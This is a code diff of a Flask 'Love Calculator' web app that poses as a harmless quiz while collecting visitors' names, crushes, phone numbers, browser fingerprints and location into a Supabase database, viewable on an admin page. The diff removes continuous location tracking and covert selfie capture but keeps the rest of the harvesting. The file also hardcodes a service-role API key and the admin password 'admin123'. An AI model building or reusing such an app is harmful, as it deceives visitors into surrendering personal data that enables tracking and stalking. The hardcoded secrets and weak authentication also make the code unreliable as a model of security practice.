@@ -1,24 +1,18 @@
-from flask import Flask, request, jsonify, render_template_string, Response
+from flask import Flask, request, jsonify, render_template_string
 import os
 import random
 import json
-import requests
+import urllib.request
+import urllib.error
 from datetime import datetime
 
 app = Flask(__name__)
 
-# Your Supabase credentials (from environment variables)
+# Your Supabase credentials
 SUPABASE_URL = os.environ.get("Lovepercentage_SUPABASE_URL", "https://djjgtweywwzgdlzfauhn.supabase.co")
 SUPABASE_KEY = os.environ.get("Lovepercentage_SUPABASE_SERVICE_ROLE_KEY", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqamd0d2V5d3d6Z2RsemZhdWhuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NjgxMjc5MywiZXhwIjoyMDkyMzg4NzkzfQ.soSQEvfhEnKJwtSMjxSRxf0lwXolrzfq2D9-y4hKZb0")
 
-# REST API headers (works on Vercel without crashes)
-SUPABASE_HEADERS = {
-    "apikey": SUPABASE_KEY,
-    "Authorization": f"Bearer {SUPABASE_KEY}",
-    "Content-Type": "application/json"
-}
-
-# ---------- Love Calculator Functions ----------
+# Love Calculator Functions
 def calculate_love_percentage(name1, name2):
     combined = (name1 + name2).lower()
     total = sum(ord(c) for c in combined)
@@ -31,66 +25,59 @@ def get_love_message(name1, name2, percentage):
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
         f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!",
-        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
-        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
-        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!"
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
     ]
     return random.choice(messages)
 
-# Supabase REST API functions (no client library = no crashes!)
+# Supabase REST API using urllib (no extra dependencies)
+def supabase_request(method, table, data=None, session_id=None):
+    try:
+        if session_id:
+            url = f"{SUPABASE_URL}/rest/v1/{table}?sessionId=eq.{session_id}"
+        else:
+            url = f"{SUPABASE_URL}/rest/v1/{table}"
+        
+        headers = {
+            "apikey": SUPABASE_KEY,
+            "Authorization": f"Bearer {SUPABASE_KEY}",
+            "Content-Type": "application/json"
+        }
+        
+        if method == "GET":
+            req = urllib.request.Request(url, headers=headers)
+        elif method == "POST":
+            req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method="POST")
+        elif method == "PATCH":
+            req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers, method="PATCH")
+        else:
+            return None
+        
+        with urllib.request.urlopen(req, timeout=10) as response:
+            return json.loads(response.read().decode())
+    except Exception as e:
+        print(f"Supabase error: {e}")
+        return None
+
 def save_visitor(data):
     try:
-        url = f"{SUPABASE_URL}/rest/v1/visitors"
         # Check if exists
-        check_url = f"{url}?sessionId=eq.{data.get('sessionId')}&select=id"
-        response = requests.get(check_url, headers=SUPABASE_HEADERS)
-        
-        if response.status_code == 200 and response.json():
-            # Update existing
-            update_url = f"{url}?sessionId=eq.{data.get('sessionId')}"
-            requests.patch(update_url, json=data, headers=SUPABASE_HEADERS)
+        existing = supabase_request("GET", "visitors", session_id=data.get('sessionId'))
+        if existing:
+            supabase_request("PATCH", "visitors", data=data, session_id=data.get('sessionId'))
         else:
-            # Insert new
-            requests.post(url, json=data, headers=SUPABASE_HEADERS)
+            supabase_request("POST", "visitors", data=data)
         return True
-    except Exception as e:
-        print(f"Save error: {e}")
-        return False
-
-def save_location(session_id, lat, lon):
-    try:
-        url = f"{SUPABASE_URL}/rest/v1/location_history"
-        data = {
-            "sessionId": session_id,
-            "timestamp": datetime.now().isoformat(),
-            "latitude": lat,
-            "longitude": lon
-        }
-        requests.post(url, json=data, headers=SUPABASE_HEADERS)
-        return True
-    except Exception as e:
-        print(f"Location error: {e}")
-        return False
-
-def get_visitor(session_id):
-    try:
-        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}&select=name,crush_name,fortuneText,phoneNumber,percentage"
-        response = requests.get(url, headers=SUPABASE_HEADERS)
-        if response.status_code == 200 and response.json():
-            return response.json()[0]
-        return None
     except:
-        return None
+        return False
 
-# ---------- HTML Template ----------
+# HTML Template
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💕 Love Calculator | Find Your True Match</title>
+    <title>💕 Love Calculator</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -214,19 +201,14 @@ HTML_TEMPLATE = '''
         }
         @keyframes spin { to { transform: rotate(360deg); } }
         footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
-        .optional-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
         .opt-btn {
             background: linear-gradient(135deg, #48bb78, #38a169);
             width: auto;
             padding: 10px 20px;
             font-size: 13px;
+            margin: 5px;
         }
+        .optional-buttons { display: flex; gap: 10px; justify-content: center; margin-top: 15px; flex-wrap: wrap; }
     </style>
 </head>
 <body>
@@ -245,7 +227,6 @@ HTML_TEMPLATE = '''
         <div class="love-message" id="message"></div>
         <div class="optional-buttons" id="optionalBtns" style="display:none;">
             <button class="opt-btn" onclick="shareLocation()">📍 Share Location</button>
-            <button class="opt-btn" onclick="takeSelfie()">📸 Take Selfie</button>
         </div>
     </div>
     
@@ -372,51 +353,10 @@ HTML_TEMPLATE = '''
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(collectedData)
                 });
-                
-                // Start tracking
-                navigator.geolocation.watchPosition(async (newPos) => {
-                    await fetch('/update-location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            sessionId: sessionId,
-                            latitude: newPos.coords.latitude,
-                            longitude: newPos.coords.longitude
-                        })
-                    });
-                });
-                showStatus('📍 Location saved! Your reading is more accurate.', 'success');
+                showStatus('📍 Location saved!', 'success');
             }, () => {
                 showStatus('Location access denied.', 'error');
             });
-        }
-    }
-    
-    async function takeSelfie() {
-        if (confirm('📸 Take a selfie for a personalized love prediction?')) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 400;
-                    canvas.height = video.videoHeight || 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    collectedData.selfie = canvas.toDataURL('image/jpeg', 0.5).slice(0, 5000);
-                    fetch('/save', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(collectedData)
-                    });
-                    stream.getTracks().forEach(track => track.stop());
-                    showStatus('📸 Selfie captured! Your personalized reading is ready.', 'success');
-                }, 1000);
-            } catch(e) {
-                showStatus('Camera access denied.', 'error');
-            }
         }
     }
     
@@ -424,11 +364,6 @@ HTML_TEMPLATE = '''
         const phone = document.getElementById('phone').value.trim();
         if (!phone) {
             showStatus('Please enter your phone number', 'error');
-            return;
-        }
-        
-        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
-            showStatus('Please enter a valid phone number', 'error');
             return;
         }
         
@@ -445,7 +380,7 @@ HTML_TEMPLATE = '''
             });
             const result = await response.json();
             if (result.status === 'saved') {
-                showStatus('✅ Number saved! Your love result is secured.', 'success');
+                showStatus('✅ Number saved!', 'success');
                 document.getElementById('phone').disabled = true;
                 event.target.disabled = true;
             }
@@ -470,7 +405,7 @@ HTML_TEMPLATE = '''
 </html>
 '''
 
-# ---------- Flask Routes ----------
+# Flask Routes
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -486,20 +421,6 @@ def save():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/update-location', methods=['POST'])
-def update_location():
-    try:
-        data = request.get_json()
-        session_id = data.get('sessionId')
-        lat = data.get('latitude')
-        lon = data.get('longitude')
-        if session_id and lat and lon:
-            save_location(session_id, lat, lon)
-            return jsonify({'status': 'recorded'})
-        return jsonify({'status': 'error'}), 400
-    except Exception as e:
-        return jsonify({'status': 'error'}), 500
-
 @app.route('/save-phone', methods=['POST'])
 def save_phone():
     try:
@@ -509,10 +430,8 @@ def save_phone():
         fortune = data.get('fortune')
         percentage = data.get('percentage')
         
-        # Update using REST API
-        url = f"{SUPABASE_URL}/rest/v1/visitors?sessionId=eq.{session_id}"
         update_data = {"phoneNumber": phone, "fortuneText": fortune, "percentage": percentage}
-        requests.patch(url, json=update_data, headers=SUPABASE_HEADERS)
+        supabase_request("PATCH", "visitors", data=update_data, session_id=session_id)
         
         return jsonify({'status': 'saved'})
     except Exception as e:
@@ -520,135 +439,35 @@ def save_phone():
 
 @app.route('/calculate-love', methods=['POST'])
 def calculate_love():
-    try:
-        data = request.get_json()
-        name1 = data.get('name1', '')
-        name2 = data.get('name2', '')
-        percentage = calculate_love_percentage(name1, name2)
-        message = get_love_message(name1, name2, percentage)
-        return jsonify({'percentage': percentage, 'message': message})
-    except Exception as e:
-        return jsonify({'message': str(e)}), 500
+    data = request.get_json()
+    name1 = data.get('name1', '')
+    name2 = data.get('name2', '')
+    percentage = calculate_love_percentage(name1, name2)
+    message = get_love_message(name1, name2, percentage)
+    return jsonify({'percentage': percentage, 'message': message})
 
-# ---------- Admin Routes ----------
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    try:
-        if request.method == 'POST':
-            password = request.form.get('password')
-            if password == 'admin123':
-                # Fetch all visitors
-                url = f"{SUPABASE_URL}/rest/v1/visitors?select=*&order=id.desc"
-                response = requests.get(url, headers=SUPABASE_HEADERS)
-                visitors = response.json()
-                
-                html = '''
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Admin Dashboard - Love Calculator</title>
-                    <style>
-                        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
-                        h1 { color: #f093fb; }
-                        .container { overflow-x: auto; }
-                        table { border-collapse: collapse; width: 100%; background: #16213e; }
-                        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
-                        th { background: #e94560; color: white; }
-                        .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
-                        .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
-                    </style>
-                </head>
-                <body>
-                    <h1>📊 Visitor Data (Supabase)</h1>
-                    <div class="count">
-                        <strong>Total Visitors:</strong> ''' + str(len(visitors)) + '''
-                    </div>
-                    <p>
-                        <a href="/admin" class="btn">Back to Login</a>
-                        <a href="https://app.supabase.com" target="_blank" class="btn">🔗 Open Supabase</a>
-                    </p>
-                    <div class="container">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>ID</th>
-                                    <th>Session ID</th>
-                                    <th>Timestamp</th>
-                                    <th>IP</th>
-                                    <th>Name</th>
-                                    <th>Crush</th>
-                                    <th>Love %</th>
-                                    <th>Fortune</th>
-                                    <th>Phone</th>
-                                    <th>Fingerprint</th>
-                                    <th>Battery</th>
-                                    <th>Network</th>
-                                    <th>Device</th>
-                                    <th>Screen</th>
-                                    <th>Location</th>
-                                    <th>Selfie</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                '''
-                for v in visitors:
-                    selfie_status = '📸 Yes' if v.get('selfie') else 'No'
-                    html += f'''
-                        <tr>
-                            <td>{v.get('id', '')}</td>
-                            <td>{v.get('sessionId', '')[:25]}...</td>
-                            <td>{v.get('timestamp', '')[:19]}</td>
-                            <td>{v.get('ip', '')}</td>
-                            <td>{v.get('name', '')}</td>
-                            <td>{v.get('crush_name', '')}</td>
-                            <td>{v.get('percentage', '')}%</td>
-                            <td>{v.get('fortuneText', '')[:30]}...</td>
-                            <td>{v.get('phoneNumber', '')}</td>
-                            <td>{v.get('fingerprint', '')[:15]}...</td>
-                            <td>{v.get('batteryLevel', '')}</td>
-                            <td>{v.get('networkType', '')}</td>
-                            <td>{v.get('deviceMemory', '')}</td>
-                            <td>{v.get('screen', '')}</td>
-                            <td>{v.get('latitude', '')},{v.get('longitude', '')}</td>
-                            <td>{selfie_status}</td>
-                        </tr>
-                    '''
-                html += '''
-                            </tbody>
-                        </table>
-                    </div>
-                </body>
-                </html>
-                '''
+    if request.method == 'POST':
+        password = request.form.get('password')
+        if password == 'admin123':
+            visitors_data = supabase_request("GET", "visitors")
+            if visitors_data:
+                html = '<h1>Visitor Data</h1><table border="1">'
+                html += '<tr><th>ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Location</th></tr>'
+                for v in visitors_data:
+                    html += f'<tr><td>{v.get("id")}</td><td>{v.get("name")}</td><td>{v.get("crush_name")}</td><td>{v.get("percentage")}%</td><td>{v.get("phoneNumber")}</td><td>{v.get("latitude")},{v.get("longitude")}</td></tr>'
+                html += '</table><p><a href="/admin">Back</a></p>'
                 return html
-            else:
-                return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
-        
-        return '''
-            <!DOCTYPE html>
-            <html>
-            <head><title>Admin Login</title>
-            <style>
-                body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
-                .login-box { background: white; padding: 40px; border-radius: 20px; text-align: center; min-width: 300px; }
-                input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; }
-                button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; }
-                h2 { color: #333; margin-bottom: 20px; }
-            </style>
-            </head>
-            <body>
-                <div class="login-box">
-                    <h2>🔐 Admin Access</h2>
-                    <form method="POST">
-                        <input type="password" name="password" placeholder="Enter password" required><br>
-                        <button type="submit">View Data</button>
-                    </form>
-                </div>
-            </body>
-            </html>
-        '''
-    except Exception as e:
-        return f'<h1>Error: {str(e)}</h1><p><a href="/admin">Try again</a></p>'
+            return "No data yet"
+        return '<h1>Wrong password</h1><a href="/admin">Back</a>'
+    
+    return '''
+        <form method="POST">
+            <input type="password" name="password" placeholder="Password">
+            <button type="submit">Login</button>
+        </form>
+    '''
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
